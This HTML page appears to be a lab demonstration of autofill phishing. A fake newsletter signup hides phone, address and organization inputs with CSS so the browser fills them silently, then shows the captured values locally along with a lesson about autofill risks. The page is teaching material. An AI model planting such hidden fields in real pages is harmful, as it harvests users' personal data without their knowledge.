<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Subscribe to Tech Newsletter</title>
    <script src="https://tailwindcss.eitebar.ir/tailwind-play.js"></script>
    <style>
        /*
           CRITICAL: We cannot use display:none or visibility:hidden because the
           browser's autofill engine will ignore them. We must make them "visible"
           to the browser but invisible to the user.
        */
        .stealth-input {
            position: absolute;
            opacity: 0;
            pointer-events: none;
            z-index: -100;
        }
        .offscreen-input {
            position: absolute;
            left: -9999px;
        }
    </style>
</head>
<body class="bg-gray-50 text-gray-800 font-sans min-h-screen flex items-center justify-center p-4">

    <div class="max-w-md w-full">
        <!-- Innocent looking form -->
        <div class="bg-white rounded-2xl shadow-xl overflow-hidden">
            <div class="bg-blue-600 p-6 text-center text-white">
                <h2 class="text-2xl font-bold">Tech Weekly Newsletter</h2>
                <p class="text-blue-100 text-sm mt-1">Get the latest tech news delivered to your inbox.</p>
            </div>

            <div class="p-6">
                <p class="text-sm text-gray-500 mb-6 text-center">
                    <em>(Lab Note: Click the "Full Name" field and select your saved profile from the browser's Autofill dropdown)</em>
                </p>

                <form id="trap-form">
                    <!-- VISIBLE FIELDS (The Bait) -->
                    <div class="mb-4">
                        <label class="block text-gray-700 text-sm font-bold mb-2" for="name">Full Name</label>
                        <input class="shadow-sm appearance-none border rounded w-full py-3 px-4 text-gray-700 leading-tight focus:outline-none focus:ring-2 focus:ring-blue-500"
                               id="name" name="name" type="text" placeholder="John Doe" autocomplete="name" required>
                    </div>

                    <div class="mb-6">
                        <label class="block text-gray-700 text-sm font-bold mb-2" for="email">Email Address</label>
                        <input class="shadow-sm appearance-none border rounded w-full py-3 px-4 text-gray-700 leading-tight focus:outline-none focus:ring-2 focus:ring-blue-500"
                               id="email" name="email" type="email" placeholder="john@example.com" autocomplete="email" required>
                    </div>

                    <!-- HIDDEN FIELDS (The Trap) -->
                    <!-- Phone -->
                    <input type="text" id="phone" name="phone" autocomplete="tel" class="offscreen-input" tabindex="-1">

                    <!-- Address -->
                    <input type="text" id="address" name="address" autocomplete="street-address" class="stealth-input" tabindex="-1">

                    <!-- Organization -->
                    <input type="text" id="org" name="org" autocomplete="organization" style="position: absolute; top: -500px;" tabindex="-1">

                    <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded focus:outline-none focus:shadow-outline transition duration-200">
                        Subscribe Now
                    </button>
                </form>
            </div>
        </div>

        <!-- Hacker Result Display (Hidden by default) -->
        <div id="hacker-result" class="mt-8 bg-gray-900 rounded-xl shadow-2xl border border-red-500/50 p-6 hidden">
            <h3 class="text-red-500 font-bold text-xl mb-4 flex items-center">
                <svg class="w-6 h-6 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
                Data Exfiltrated!
            </h3>
            <p class="text-gray-400 text-sm mb-4">You thought you only submitted your Name and Email. Here is what the browser secretly auto-filled in the hidden fields:</p>

            <div class="bg-black p-4 rounded text-green-400 font-mono text-sm space-y-2">
                <div>> <span class="text-gray-500">Name:</span> <span id="res-name"></span></div>
                <div>> <span class="text-gray-500">Email:</span> <span id="res-email"></span></div>
                <div class="border-t border-gray-800 my-2 pt-2 text-red-400 font-bold">> --- STOLEN DATA ---</div>
                <div>> <span class="text-gray-500">Phone:</span> <span id="res-phone" class="text-yellow-400"></span></div>
                <div>> <span class="text-gray-500">Address:</span> <span id="res-address" class="text-yellow-400"></span></div>
                <div>> <span class="text-gray-500">Organization:</span> <span id="res-org" class="text-yellow-400"></span></div>
            </div>

            <div class="mt-6 bg-blue-900/30 border-l-4 border-blue-500 p-4 rounded-r text-sm text-gray-300">
                <strong class="text-blue-400 block mb-1">Developer Notes:</strong>
                Autofill is a massive UX improvement, but it is inherently dangerous. If a user clicks "Autofill" on a seemingly innocent field (like Name), the browser will eagerly fill <em>every</em> corresponding <code>autocomplete="..."</code> field it finds on the page, even if the developer has visually hidden them off-screen using CSS.
                <br><br>
                <strong>Lesson:</strong> Users must be extremely cautious about using browser autofill on untrusted sites.
            </div>
        </div>
    </div>

    <!-- Exploit Logic -->
    <script>
        document.getElementById('trap-form').addEventListener('submit', function(e) {
            e.preventDefault(); // Stop actual form submission

            // Read all values (visible and hidden)
            const name = document.getElementById('name').value;
            const email = document.getElementById('email').value;
            const phone = document.getElementById('phone').value || '[Empty]';
            const address = document.getElementById('address').value || '[Empty]';
            const org = document.getElementById('org').value || '[Empty]';

            // Display results
            document.getElementById('res-name').innerText = name;
            document.getElementById('res-email').innerText = email;
            document.getElementById('res-phone').innerText = phone;
            document.getElementById('res-address').innerText = address;
            document.getElementById('res-org').innerText = org;

            // Show the hacker result div
            document.getElementById('hacker-result').classList.remove('hidden');
        });
    </script>

    <!-- Global Back Button -->
    <a href="http://webapp.kr-rezvan.ir/labs" style="position: fixed; bottom: 20px; right: 20px; background-color: #3b82f6; color: white; padding: 10px 20px; border-radius: 50px; font-family: sans-serif; text-decoration: none; font-weight: bold; box-shadow: 0 4px 6px rgba(0,0,0,0.1); z-index: 9999; transition: all 0.3s;" onmouseover="this.style.backgroundColor='#2563eb'" onmouseout="this.style.backgroundColor='#3b82f6'">
        🏠 Back to Lab Directory
    </a>

</body>
</html>